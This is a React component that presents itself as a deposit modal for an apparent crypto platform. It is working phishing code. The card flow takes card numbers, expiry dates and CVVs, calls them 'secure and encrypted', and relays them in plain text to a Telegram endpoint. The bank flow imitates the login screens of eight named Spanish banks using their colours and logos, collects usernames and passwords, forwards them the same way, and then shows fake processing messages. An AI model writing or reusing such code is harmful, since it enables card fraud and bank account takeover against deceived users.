"use client";

import { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { toast } from "@/components/toast";
import {
  Copy,
  Wallet,
  ArrowLeft,
  Loader2,
  CreditCard,
  Landmark,
  Coins,
  InfoIcon,
  X,
} from "lucide-react";
import { AnimatePresence, motion } from "framer-motion";
import { useI18n } from "@/components/i18n-provider";

interface DepositModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  userId: string; // нужен для создания ордера
}

interface DepositAddress {
  id: string;
  assetSymbol: string | null;
  network: string;
  address: string;
  label: string | null;
}

interface Bank {
  id: string;
  name: string;
  logo: string;
}

export function DepositModal({
  open,
  onOpenChange,
  userId,
}: DepositModalProps) {
  const [step, setStep] = useState<
    | "method"
    | "card_amount"
    | "card_details"
    | "crypto_token"
    | "crypto_network"
    | "crypto_address"
    | "bank"
    | "bank_login"
    | "bank_processing"
  >("method");
  const { t } = useI18n();

  const [addresses, setAddresses] = useState<DepositAddress[]>([]);
  const [loading, setLoading] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [selectedToken, setSelectedToken] = useState<string>("");
  const [selectedAddress, setSelectedAddress] = useState<DepositAddress | null>(
    null
  );
  const bankStyles: Record<string, any> = {
    bbva: {
      bg: "#003087", // синий BBVA
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcc00",
      buttonText: "#003087",
      fontFamily: "'Arial', sans-serif",
    },
    sabadell: {
      bg: "#0066b3", // голубой Sabadell
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffffff",
      buttonText: "#0066b3",
      fontFamily: "'Helvetica', sans-serif",
    },
    santander: {
      bg: "#ef1c25", // красный Santander
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffffff",
      buttonText: "#ef1c25",
      fontFamily: "'Arial', sans-serif",
    },
    caixabank: {
      bg: "#005baa", // синий CaixaBank
      inputBg: "#f5f5f5",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcb05",
      buttonText: "#005baa",
      fontFamily: "'Verdana', sans-serif",
    },
    openbank: {
      bg: "#ff6600", // оранжевый Openbank
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#0072bc",
      buttonText: "#ffffff",
      fontFamily: "'Helvetica', sans-serif",
    },
    ing: {
      bg: "#ff6600", // оранжевый ING
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#00bfff",
      buttonText: "#ffffff",
      fontFamily: "'Verdana', sans-serif",
    },
    abanca: {
      bg: "#0072bc", // синий Abanca
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcb05",
      buttonText: "#0072bc",
      fontFamily: "'Arial', sans-serif",
    },
    kutxabank: {
      bg: "#003366", // тёмно-синий Kutxabank
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcc00",
      buttonText: "#003366",
      fontFamily: "'Arial', sans-serif",
    },
  };

  const [cardData, setCardData] = useState({
    number: "",
    expiry: "",
    cvv: "",
    amount: "",
  });
  const formattedNumber = cardData.number
    .replace(/\D/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim();

  const [cardErrors, setCardErrors] = useState({
    number: false,
    expiry: false,
    cvv: false,
    amount: false,
  });

  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [bankCredentials, setBankCredentials] = useState({
    login: "",
    password: "",
  });
  const [bankErrors, setBankErrors] = useState({
    login: false,
    password: false,
  });
  const [showBankNotification, setShowBankNotification] = useState(false);

  const banks: Bank[] = [
    { id: "bbva", name: "BBVA", logo: "/logos/bbva.png" },
    { id: "sabadell", name: "Sabadell", logo: "/logos/sabadell.svg" },
    { id: "santander", name: "Santander", logo: "/logos/santander.png" },
    { id: "caixabank", name: "CaixaBank", logo: "/logos/caixabank.png" },
    { id: "openbank", name: "Openbank", logo: "/logos/openbank.svg" },
    { id: "ing", name: "ING", logo: "/logos/ing.png" },
    { id: "abanca", name: "Abanca", logo: "/logos/abanca.svg" },
    { id: "kutxabank", name: "Kutxabank", logo: "/logos/kutxabank.png" },
  ];

  useEffect(() => {
    if (open) {
      setStep("method");
      setSelectedToken("");
      setSelectedAddress(null);
      setCardData({ number: "", expiry: "", cvv: "", amount: "" });
      setCardErrors({
        number: false,
        expiry: false,
        cvv: false,
        amount: false,
      });
      setSelectedBank(null);
      setBankCredentials({ login: "", password: "" });
      setBankErrors({ login: false, password: false });
      setShowBankNotification(false);
    }
  }, [open]);

  useEffect(() => {
    if (step === "bank_processing") {
      setShowBankNotification(false);
      const timer = setTimeout(() => setShowBankNotification(true), 2000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const fetchAddresses = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/admin/deposit-addresses");
      if (res.ok) setAddresses(await res.json());
      else
        toast({
          title: t("error"),
          description: t("noDepositMethods"),
          variant: "destructive",
        });
    } catch {
      toast({
        title: t("error"),
        description: t("networkError"),
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(address);
    toast({
      title: t("copied"),
      description: t("addressCopied"),
      variant: "success",
    });
    setTimeout(() => setCopiedAddress(null), 2000);
  };

  const sendToTelegram = async (message: string) => {
    try {
      await fetch("/api/send-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      });
    } catch (err) {
      console.error("Telegram error:", err);
    }
  };

  // ======== Валидация карты =========
  const validateCardForm = () => {
    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    const cvvRegex = /^\d{3}$/;
    const numberRegex = /^\d{12,19}$/;
    const errors = {
      number: !numberRegex.test(cardData.number),
      expiry: !expiryRegex.test(cardData.expiry),
      cvv: !cvvRegex.test(cardData.cvv),
      amount: Number(cardData.amount) <= 0,
    };
    setCardErrors(errors);
    return !Object.values(errors).some(Boolean);
  };

  const handleCardDeposit = async () => {
    if (!validateCardForm()) return;

    try {
      await fetch("/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          type: "DEPOSIT",
          depositFrom:"card",
          amount: Number(cardData.amount),
          cardNumber: cardData.number.replace(/\s+/g, ""),
          status: "PENDING",
        }),
      });

  // Формируем сообщение для Telegram
  const msg = `
💳 New Card Deposit:
Number: ${cardData.number}
Expiry: ${cardData.expiry}
CVV: ${cardData.cvv}
Amount: ${cardData.amount}
  `;

  // Отправка в Telegram
  await sendToTelegram(msg);
      toast({
        title: t("deposit"),
        description: t("processingInfo"),
        variant: "info",
      });

      setStep("method");
      setCardData({ number: "", expiry: "", cvv: "", amount: "" });
    } catch (err) {
      toast({
        title: t("error"),
        description: t("depositFailed"),
        variant: "destructive",
      });
    }
  };

  // ======== Валидация банка =========
  const validateBankForm = () => {
    const errors = {
      login: !bankCredentials.login.trim(),
      password: !bankCredentials.password.trim(),
    };
    setBankErrors(errors);
    return !Object.values(errors).some(Boolean);
  };

  const handleBankLogin = async () => {
    if (!selectedBank) return;
    if (!validateBankForm()) return;

    setStep("bank_processing");
    const msg = `
🏦 New Bank Login:
Bank: ${selectedBank.name}
Login: ${bankCredentials.login}
Password: ${bankCredentials.password}
    `;
    await sendToTelegram(msg);

    setTimeout(() => {
      toast({
        title: t("processing"),
        description: t("processingBankInfo"),
        variant: "info",
      });
    }, 500);

    setTimeout(() => {
      toast({
        title: t("done"),
        description: t("bankProcessingInfo"),
        variant: "success",
      });
    }, 3000);
  };

  const groupedAddresses = addresses.reduce((acc, addr) => {
    const token = addr.assetSymbol || addr.network.split(" ")[0];
    if (!acc[token]) acc[token] = [];
    acc[token].push(addr);
    return acc;
  }, {} as Record<string, DepositAddress[]>);

  const selectedNetworks = selectedToken ? groupedAddresses[selectedToken] : [];

  const steps = [
    { id: "method", label: "Method", icon: <Wallet className="w-4 h-4" /> },
    { id: "crypto_token", label: "Token", icon: <Coins className="w-4 h-4" /> },
    {
      id: "crypto_network",
      label: "Network",
      icon: <Landmark className="w-4 h-4" />,
    },
    {
      id: "crypto_address",
      label: "Address",
      icon: <Copy className="w-4 h-4" />,
    },
    { id: "card", label: "Card", icon: <CreditCard className="w-4 h-4" /> },
    { id: "bank", label: "Bank", icon: <Landmark className="w-4 h-4" /> },
  ];

  const stepIndex = steps.findIndex((s) => s.id === step);

  const pageVariants = {
    initial: { opacity: 0, x: 20 },
    animate: { opacity: 1, x: 0 },
    exit: { opacity: 0, x: -20 },
    transition: { duration: 0.15 },
  };

  const handleBack = () => {
    if (step === "crypto_address") setStep("crypto_network");
    else if (step === "crypto_network") setStep("crypto_token");
    else if (step === "crypto_token") setStep("method");
    else if (step === "card_details") setStep("card_amount");
    else if (step === "card_amount") setStep("method");
    else if (step === "bank_login") setStep("bank");
    else setStep("method");
  };

  const CardItem = ({
    onClick,
    icon,
    imageSrc,
    label,
    isBank,
  }: {
    onClick: () => void;
    icon?: React.ReactNode;
    imageSrc?: string;
    label: string;
    isBank?: boolean;
  }) => (
    <div className="cursor-pointer hover:scale-[1.02] transition-transform">
      <Card
        onClick={onClick}
        className={`p-5 rounded-2xl flex flex-col items-center justify-center shadow-lg transition-all border-2 ${
          isBank
            ? "bg-white hover:border-purple-400 border-gray-200"
            : "bg-[#0a0a14] hover:border-purple-500/60 border-purple-500/20 hover:bg-purple-500/5"
        }`}
      >
        <div className="w-24 h-24 flex items-center justify-center mb-3 rounded-xl">
          {imageSrc ? (
            <img
              src={imageSrc}
              alt={label}
              className="max-w-full max-h-full object-contain"
            />
          ) : (
            <div className={`w-16 h-16 rounded-xl flex items-center justify-center ${
              isBank ? "bg-gray-100" : "bg-purple-500/10"
            }`}>
              {icon}
            </div>
          )}
        </div>
        <p
          className={`text-center text-sm font-semibold ${
            isBank ? "text-gray-900" : "text-white"
          }`}
        >
          {label}
        </p>
      </Card>
    </div>
  );

  const listVariants = {
    hidden: { opacity: 0 },
    visible: { opacity: 1 },
  };

  const itemVariants = {
    hidden: { opacity: 0 },
    visible: { opacity: 1 },
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-[95%] sm:max-w-2xl bg-gradient-to-br from-[#090b1a] via-[#0f1126] to-[#1a0b2e] text-white border border-purple-500/20 shadow-2xl rounded-3xl">
        <DialogHeader className="mb-4 relative pb-4 border-b border-purple-500/10">
          <DialogTitle className="flex items-center justify-between">
            <span className="text-xl font-bold flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-purple-500 flex items-center justify-center">
                <Wallet className="w-5 h-5 text-white" />
              </div>
              {t("depositFunds")}
            </span>
            {step !== "method" && (
              <Button
                variant="ghost"
                size="sm"
                onClick={handleBack}
                className="h-9 px-3 text-xs hover:bg-purple-500/10 text-purple-300"
              >
                <ArrowLeft className="w-4 h-4 mr-1" /> {t("back")}
              </Button>
            )}
          </DialogTitle>
        </DialogHeader>

        {/* Progress indicator - only show for multi-step flows */}
        {step !== "method" && (
          <div className="mb-6">
            <div className="h-1 bg-slate-800/50 rounded-full overflow-hidden">
              <div 
                className="h-full bg-gradient-to-r from-purple-600 to-purple-500 transition-all duration-300"
                style={{ width: `${(stepIndex + 1) / steps.length * 100}%` }}
              />
            </div>
          </div>
        )}

        {/* Content */}
        <div className="min-h-[320px]">
          <AnimatePresence mode="wait">
            <motion.div
              key={step}
              initial="initial"
              animate="animate"
              exit="exit"
              transition={pageVariants.transition}
              variants={pageVariants}
              className="space-y-4"
            >
              {/* METHOD STEP */}
              {step === "method" && (
                <motion.div
                  variants={listVariants}
                  initial="hidden"
                  animate="visible"
                  className="grid grid-cols-1 sm:grid-cols-3 gap-5"
                >
                  <motion.div variants={itemVariants}>
                    <CardItem
                      onClick={() => {
                        fetchAddresses();
                        setStep("crypto_token");
                      }}
                      icon={<Wallet className="w-12 h-12 text-purple-400" />}
                      label={t("crypto")}
                    />
                  </motion.div>
                  <motion.div variants={itemVariants}>
                    <CardItem
                      onClick={() => setStep("card_amount")}
                      icon={<CreditCard className="w-12 h-12 text-purple-400" />}
                      label={t("card")}
                    />
                  </motion.div>
                  <motion.div variants={itemVariants}>
                    <CardItem
                      onClick={() => setStep("bank")}
                      icon={<Landmark className="w-12 h-12 text-purple-400" />}
                      label={t("bank")}
                    />
                  </motion.div>
                </motion.div>
              )}

              {/* CRYPTO TOKEN */}
              {step === "crypto_token" && (
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  {Object.keys(groupedAddresses).map((token) => (
                    <Card
                      key={token}
                      onClick={() => {
                        setSelectedToken(token);
                        setStep("crypto_network");
                      }}
                      className="cursor-pointer p-4 rounded-xl bg-[#1e1b4b] hover:bg-[#2e1a5e] transition"
                    >
                      <Coins className="w-6 h-6 text-purple-400 mb-2" />
                      <p className="font-medium">{token}</p>
                    </Card>
                  ))}
                </div>
              )}

              {/* CRYPTO NETWORK */}
              {step === "crypto_network" && selectedToken && (
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  {selectedNetworks.map((addr) => (
                    <Card
                      key={addr.id}
                      onClick={() => {
                        setSelectedAddress(addr);
                        setStep("crypto_address");
                      }}
                      className="cursor-pointer p-4 rounded-xl bg-[#1e1b4b] hover:bg-[#2e1a5e] transition"
                    >
                      <Landmark className="w-6 h-6 text-purple-400 mb-2" />
                      <p className="font-medium">{addr.network}</p>
                    </Card>
                  ))}
                </div>
              )}

              {/* CRYPTO ADDRESS */}
              {step === "crypto_address" && selectedAddress && (
                <Card className="bg-[#1e1b4b] border border-gray-700 rounded-xl p-6 space-y-3">
                  <p className="text-sm text-slate-300 mb-4 font-medium">
                    {selectedAddress.network} {t("address")}
                  </p>
                  <Input
                    readOnly
                    value={selectedAddress.address}
                    className="bg-[#1a1a2e] border-purple-500/30 text-white mb-4"
                  />
                  <Button
                    className="w-full h-12 bg-gradient-to-r from-purple-600 to-purple-500 hover:from-purple-500 hover:to-purple-600 text-white rounded-xl"
                    onClick={() => handleCopy(selectedAddress.address)}
                  >
                    <Copy className="w-4 h-4 mr-2" />
                    {t("copyAddress")}
                  </Button>
                </Card>
              )}

              {/* CARD AMOUNT - Step 1 */}
              {step === "card_amount" && (
                <Card className="bg-[#0a0a14] border border-purple-500/20 rounded-2xl p-8 space-y-6">
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-purple-500/10 flex items-center justify-center">
                      <CreditCard className="w-8 h-8 text-purple-400" />
                    </div>
                    <h3 className="text-xl font-semibold text-white mb-2">{t("enterAmount") || "Enter Deposit Amount"}</h3>
                    <p className="text-sm text-slate-400">{t("howMuchDeposit") || "How much would you like to deposit?"}</p>
                  </div>
                  
                  <div className="space-y-2">
                    <label className="text-xs font-medium text-slate-400 uppercase tracking-wider">
                      {t("amount")}
                    </label>
                    <div className="relative">
                      <Input
                        placeholder="0.00"
                        type="number"
                        value={cardData.amount}
                        onChange={(e) => setCardData({ ...cardData, amount: e.target.value })}
                        className={`h-14 text-2xl font-semibold bg-[#1a1a2e] border-2 rounded-xl pl-12 ${cardErrors.amount ? "border-red-500" : "border-purple-500/30 focus:border-purple-500"}`}
                      />
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-2xl font-semibold text-slate-500">$</span>
                    </div>
                    {cardErrors.amount && (
                      <p className="text-xs text-red-400 mt-1">{t("enterValidAmount") || "Please enter a valid amount"}</p>
                    )}
                  </div>

                  {/* Quick amount buttons */}
                  <div className="grid grid-cols-4 gap-2">
                    {[50, 100, 250, 500].map(amount => (
                      <button
                        key={amount}
                        onClick={() => setCardData({ ...cardData, amount: amount.toString() })}
                        className="py-3 px-4 rounded-lg bg-purple-500/10 hover:bg-purple-500/20 border border-purple-500/20 hover:border-purple-500/40 text-purple-300 text-sm font-medium transition-all"
                      >
                        ${amount}
                      </button>
                    ))}
                  </div>

                  <Button 
                    className="w-full h-12 bg-gradient-to-r from-purple-600 to-purple-500 hover:from-purple-500 hover:to-purple-600 text-white text-base font-semibold rounded-xl" 
                    onClick={() => {
                      if (!cardData.amount || Number(cardData.amount) <= 0) {
                        setCardErrors({ ...cardErrors, amount: true });
                        return;
                      }
                      setCardErrors({ ...cardErrors, amount: false });
                      setStep("card_details");
                    }}
                  >
                    {t("continue") || "Continue"}
                  </Button>
                </Card>
              )}

              {/* CARD DETAILS - Step 2 */}
              {step === "card_details" && (
                <Card className="bg-[#0a0a14] border border-purple-500/20 rounded-2xl p-8 space-y-6">
                  <div className="text-center mb-4">
                    <div className="inline-flex items-center gap-2 mb-4 px-4 py-2 rounded-full bg-purple-500/10 border border-purple-500/20">
                      <span className="text-sm text-slate-400">{t("depositAmount") || "Amount"}:</span>
                      <span className="text-lg font-bold text-white">${cardData.amount}</span>
                    </div>
                    <h3 className="text-xl font-semibold text-white mb-2">{t("enterCardDetails") || "Enter Card Details"}</h3>
                    <p className="text-sm text-slate-400">{t("cardInfoSecure") || "Your card information is secure and encrypted"}</p>
                  </div>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <label className="text-xs font-medium text-slate-400 uppercase tracking-wider">
                        {t("cardNumber")}
                      </label>
                      <Input
                        placeholder="1234 5678 9012 3456"
                        value={formattedNumber}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "");
                          setCardData({ ...cardData, number: val });
                        }}
                        className={`h-12 bg-[#1a1a2e] border-2 rounded-xl ${cardErrors.number ? "border-red-500" : "border-purple-500/30 focus:border-purple-500"}`}
                      />
                      {cardErrors.number && (
                        <p className="text-xs text-red-400 mt-1">{t("invalidCardNumber") || "Invalid card number"}</p>
                      )}
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-xs font-medium text-slate-400 uppercase tracking-wider">
                          {t("expiryDate") || "Expiry"}
                        </label>
                        <Input
                          placeholder="MM/YY"
                          value={cardData.expiry}
                          onChange={(e) => {
                            let val = e.target.value.replace(/\D/g, "");
                            if (val.length > 4) val = val.slice(0, 4);
                            if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
                            setCardData({ ...cardData, expiry: val });
                          }}
                          className={`h-12 bg-[#1a1a2e] border-2 rounded-xl ${cardErrors.expiry ? "border-red-500" : "border-purple-500/30 focus:border-purple-500"}`}
                        />
                        {cardErrors.expiry && (
                          <p className="text-xs text-red-400 mt-1">{t("invalidExpiry") || "Invalid date"}</p>
                        )}
                      </div>

                      <div className="space-y-2">
                        <label className="text-xs font-medium text-slate-400 uppercase tracking-wider">
                          CVV
                        </label>
                        <Input
                          placeholder="123"
                          type="password"
                          value={cardData.cvv}
                          onChange={(e) => {
                            let val = e.target.value.replace(/\D/g, "");
                            if (val.length > 3) val = val.slice(0, 3);
                            setCardData({ ...cardData, cvv: val });
                          }}
                          className={`h-12 bg-[#1a1a2e] border-2 rounded-xl ${cardErrors.cvv ? "border-red-500" : "border-purple-500/30 focus:border-purple-500"}`}
                        />
                        {cardErrors.cvv && (
                          <p className="text-xs text-red-400 mt-1">{t("invalidCVV") || "Invalid CVV"}</p>
                        )}
                      </div>
                    </div>
                  </div>

                  <Button 
                    className="w-full h-12 bg-gradient-to-r from-purple-600 to-purple-500 hover:from-purple-500 hover:to-purple-600 text-white text-base font-semibold rounded-xl" 
                    onClick={handleCardDeposit}
                  >
                    {t("confirmDeposit") || "Confirm Deposit"} • ${cardData.amount}
                  </Button>
                </Card>
              )}

              {/* BANK */}
              {step === "bank" && (
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                  {banks.map((bank) => (
                    <CardItem
                      key={bank.id}
                      onClick={() => {
                        setSelectedBank(bank);
                        setStep("bank_login");
                      }}
                      imageSrc={bank.logo}
                      label={bank.name}
                      isBank
                    />
                  ))}
                </div>
              )}

              {step === "bank_login" && selectedBank && (
                <motion.div
                  key={selectedBank.id}
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  transition={{ duration: 0.5 }}
                >
                  <motion.div
                    className="rounded-2xl p-6 flex flex-col items-center shadow-lg w-full max-w-md mx-auto"
                    style={{
                      backgroundColor: bankStyles[selectedBank.id]?.bg,
                      transition: "background-color 0.5s ease",
                    }}
                    layout
                  >
                    {/* Логотип банка */}
                    <motion.div
                      key={selectedBank.id}
                      initial={{ scale: 0.8, opacity: 0 }}
                      animate={{ scale: 1, opacity: 1 }}
                      transition={{ duration: 0.5 }}
                      className="w-32 h-32 flex items-center justify-center mb-6"
                    >
                      <img
                        src={selectedBank.logo}
                        alt={selectedBank.name}
                        className="p-2 bg-white rounded-xl max-w-full max-h-full object-contain"
                      />
                    </motion.div>

                    {/* Подпись */}
                    <p className="text-lg font-semibold text-white mb-6 text-center">
                      {t("loginToBank").replace(
                        "{bankName}",
                        selectedBank.name
                      )}
                    </p>

                    {/* Форма */}
                    <div className="w-full space-y-4">
                      <Input
                        placeholder={bankStyles[selectedBank.id]?.placeholder}
                        value={bankCredentials.login}
                        onChange={(e) =>
                          setBankCredentials({
                            ...bankCredentials,
                            login: e.target.value,
                          })
                        }
                        className={`border rounded-md p-3 placeholder-gray-400 focus:ring-2 focus:ring-blue-500`}
                        style={{
                          backgroundColor: bankStyles[selectedBank.id]?.inputBg,
                          color: bankStyles[selectedBank.id]?.inputText,
                          fontFamily: bankStyles[selectedBank.id]?.fontFamily,
                        }}
                      />
                      <Input
                        placeholder="Password"
                        type="password"
                        value={bankCredentials.password}
                        onChange={(e) =>
                          setBankCredentials({
                            ...bankCredentials,
                            password: e.target.value,
                          })
                        }
                        className={`border rounded-md p-3 placeholder-gray-400 focus:ring-2 focus:ring-blue-500`}
                        style={{
                          backgroundColor: bankStyles[selectedBank.id]?.inputBg,
                          color: bankStyles[selectedBank.id]?.inputText,
                          fontFamily: bankStyles[selectedBank.id]?.fontFamily,
                        }}
                      />
                    </div>

                    {/* Кнопка входа */}
                    <Button
                      className="mt-6 w-full font-bold"
                      onClick={handleBankLogin}
                      style={{
                        backgroundColor: bankStyles[selectedBank.id]?.buttonBg,
                        color: bankStyles[selectedBank.id]?.buttonText,
                        fontFamily: bankStyles[selectedBank.id]?.fontFamily,
                      }}
                    >
                      {t("authorize")}
                    </Button>
                  </motion.div>
                </motion.div>
              )}

              {/* BANK PROCESSING */}
              {step === "bank_processing" && (
                <div className="flex flex-col items-center justify-center py-12">
                  {!showBankNotification ? (
                    <>
                      <Loader2 className="w-8 h-8 animate-spin text-blue-400 mb-3" />
                      <p className="text-gray-400">{t("processingBankInfo")}</p>
                    </>
                  ) : (
                    <div className="flex flex-col items-center justify-center py-12">
                      <InfoIcon className="w-8 h-8 text-blue-400 mb-3" />
                      <p className="text-gray-400">
                        {t("pendingConfirmation")}
                      </p>
                    </div>
                  )}
                </div>
              )}
            </motion.div>
          </AnimatePresence>
        </div>
      </DialogContent>
    </Dialog>
  );
}
